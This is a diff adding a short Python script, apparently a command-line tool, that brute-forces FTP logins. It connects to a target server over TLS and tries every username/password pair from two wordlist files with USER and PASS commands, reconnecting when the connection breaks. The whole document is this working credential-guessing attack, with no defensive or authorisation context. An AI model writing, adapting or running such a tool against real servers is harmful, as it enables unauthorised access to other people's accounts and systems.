@@ -1,0 +1,58 @@
+#!/usr/bin/env python3
+"""
+Usage:
+    login <server> -L logins.txt -P passwords.txt [options]
+
+Options:
+    -p --port=PORT              [default: 21]
+    -L --logins=LOGIN_FILE
+    -P --passwords=PASSWORD_FILE
+    -v --verbosity=LEVEL        [default: debug]
+"""
+from docopt import docopt
+from socket import socket
+import time
+import ssl
+import logging
+
+
+if __name__ == "__main__":
+    args = docopt(__doc__)
+    logging.basicConfig(level=getattr(logging, args["--verbosity"].upper()))
+    server, port, login_path, password_path = args["<server>"], int(args["--port"]), args["--logins"], args["--passwords"]
+
+    s = socket()
+    s.connect((server, port))
+    s = ssl.wrap_socket(s)
+    logging.debug(s.recv().decode().strip())
+
+    users = [w.strip() for w in open(login_path).readlines()]
+    passwords = [w.strip() for w in open(password_path).readlines()]
+
+    for l, login in enumerate(users):
+        for p, password in enumerate(passwords):
+            try:
+                logging.info('{} / {}: {} / {}'.format(l, p, login, password))
+
+                cmd = 'USER {}\r\n'.format(login.strip())
+                logging.debug(cmd.strip())
+                s.send(cmd.encode())
+                result = s.recv().decode().strip()
+                logging.debug(result)
+                assert result.startswith("331"), "331 expected: " + result
+
+                cmd = 'PASS {}\r\n'.format(password.strip())
+                logging.debug(cmd.strip())
+                s.send(cmd.encode())
+                result = s.recv().decode().strip()
+                logging.debug(result)
+                assert result.startswith("530"), result
+
+            except BrokenPipeError as e:
+                logging.debug(str(e))
+                s = socket()
+                s.connect((server, port))
+                s = ssl.wrap_socket(s)
+                logging.debug(s.recv().decode().strip())
+
+    s.close()
